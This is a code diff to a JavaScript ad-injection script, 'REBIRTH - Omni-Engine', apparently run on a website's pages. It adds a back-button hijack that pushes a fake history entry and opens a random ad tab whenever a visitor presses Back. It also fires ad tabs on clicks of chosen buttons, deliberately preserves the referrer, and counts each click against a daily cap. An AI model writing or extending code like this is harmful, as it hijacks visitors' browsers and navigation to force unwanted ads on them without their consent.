@@ -1,7 +1,7 @@
 /**
- * V1.3.1 REBIRTH - Slim Engine
- * Soul of v1.3.1 + 80/10/10 + Anti-Repeat + Daily Cap
- * NO security fluff (handled by XML). ZERO delay at mousedown.
+ * V1.3.1 REBIRTH - Omni-Engine
+ * Daily Cap + Anti-Repeat + Back Button Hijack + Direct Open
+ * NO security fluff (handled by XML). ZERO delay trigger.
  */
 
 const CHACHA_CONFIG = {
@@ -22,7 +22,7 @@ const CHACHA_CONFIG = {
     },
 
     SETTINGS: {
-        MAX_CLICKS_TODAY: 9,
+        MAX_CLICKS_TODAY: 2,
         CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
     }
 };
@@ -41,12 +41,13 @@ const _validIds = [
 ];
 
 const _STORAGE_KEY = '_mc_rebirth_';
+const _HISTORY_STATE = 'chacha_rebirth_lock';
 
 function _getStore() {
     try {
         const raw = localStorage.getItem(_STORAGE_KEY);
-        return raw ? JSON.parse(raw) : { c: 0, date: null, lastId: null };
-    } catch (e) { return { c: 0, date: null, lastId: null }; }
+        return raw ? JSON.parse(raw) : { c: 0, lastClickDate: null, lastAdId: null };
+    } catch (e) { return { c: 0, lastClickDate: null, lastAdId: null }; }
 }
 
 function _setStore(o) {
@@ -57,33 +58,41 @@ function _today() {
     return new Date().toISOString().slice(0, 10);
 }
 
-function _pickLink() {
+function _pickLink(bucket) {
     const store = _getStore();
     const today = _today();
 
-    if (store.date !== today) {
+    if (store.lastClickDate !== today) {
         store.c = 0;
-        store.date = today;
-        store.lastId = null;
+        store.lastClickDate = today;
+        store.lastAdId = null;
     }
 
     const luck = Math.random() * 100;
-    let pool = luck < 80 ? _baskets.h : (luck < 90 ? _baskets.n : _baskets.l);
-
-    let fresh = pool.filter(u => u !== store.lastId);
+    const pool = bucket || (luck < 80 ? _baskets.h : luck < 90 ? _baskets.n : _baskets.l);
+    let fresh = pool.filter(u => u !== store.lastAdId);
     if (fresh.length === 0) fresh = pool;
 
-    const pick = fresh[Math.floor(Math.random() * fresh.length)];
+    let pick = fresh[Math.floor(Math.random() * fresh.length)];
+    if (pick === store.lastAdId) {
+        fresh = pool.filter(u => u !== pick);
+        pick = fresh.length ? fresh[Math.floor(Math.random() * fresh.length)] : pool[0];
+    }
     return { url: pick, store };
 }
 
 function _jump(url) {
-    const w = window.open('about:blank', '_blank');
+    const w = window.open(url, '_blank', 'noopener');  // no noreferrer = referrer preserved
     if (w) {
-        w.location.href = url;
-        try { w.focus(); } catch (e) {}  // non-blocking, doesn't stop page scripts
+        try { w.opener = null; w.focus(); } catch (e) {}
     } else {
-        window.location.assign(url);
+        const a = document.createElement('a');
+        a.href = url;
+        a.target = '_blank';
+        a.rel = 'noopener';  // noreferrer omitted to preserve referrer
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
     }
 }
 
@@ -100,28 +109,62 @@ function _scanAsync(btnId, url, count) {
     });
 }
 
-// --- CLICK BUBBLE: Ad fires AFTER button's native action (Server/Player load) ---
-// No preventDefault/stopPropagation - event continues to bubble. _jump does not block.
+function _fireAd(btnId, fromBack) {
+    const { url, store } = _pickLink(fromBack ? _baskets.l : null);
+    store.c++;
+    store.lastClickDate = _today();
+    store.lastAdId = url;
+    _setStore(store);
+    _jump(url);
+    _scanAsync(btnId || 'back-hijack', url, store.c);
+}
+
+// --- HISTORY API HIJACK: Back button fires Low bucket ad ---
+function _lockHistory() {
+    if (window.history.state !== _HISTORY_STATE) {
+        window.history.pushState(_HISTORY_STATE, null, window.location.href);
+    }
+}
+_lockHistory();
+
+window.onpopstate = function() {
+    _lockHistory();
+    const store = _getStore();
+    const today = _today();
+    if (store.lastClickDate !== today) {
+        store.c = 0;
+        store.lastClickDate = today;
+        store.lastAdId = null;
+        _setStore(store);
+    }
+    if (store.c < CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
+        _fireAd('back-hijack', true);
+    }
+};
+
+// --- CLICK BUBBLE: Ad fires AFTER button's native action ---
 document.addEventListener('click', function(e) {
     const btn = e.target.closest('[id]');
     if (!btn || !_validIds.includes(btn.id)) return;
 
-    const { url, store } = _pickLink();
+    const store = _getStore();
+    const today = _today();
+
+    if (store.lastClickDate !== today) {
+        store.c = 0;
+        store.lastClickDate = today;
+        store.lastAdId = null;
+        _setStore(store);
+    }
 
     if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
         if (!CHACHA_CONFIG.DEBUG_MODE) {
             window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
             return;
         }
-        if (CHACHA_CONFIG.DEBUG_MODE) console.warn("[REBIRTH] Cap reached, DEBUG allows continue");
+        if (CHACHA_CONFIG.DEBUG_MODE) console.warn("[REBIRTH] Cap reached, ad NOT fired.");
+        return;
     }
 
-    store.c++;
-    store.date = _today();
-    store.lastId = url;
-    _setStore(store);
-
-    _jump(url);
-
-    _scanAsync(btn.id, url, store.c);
-}, false);  // bubble phase: runs after target, native button action executes first
+    _fireAd(btn.id, false);
+}, false);
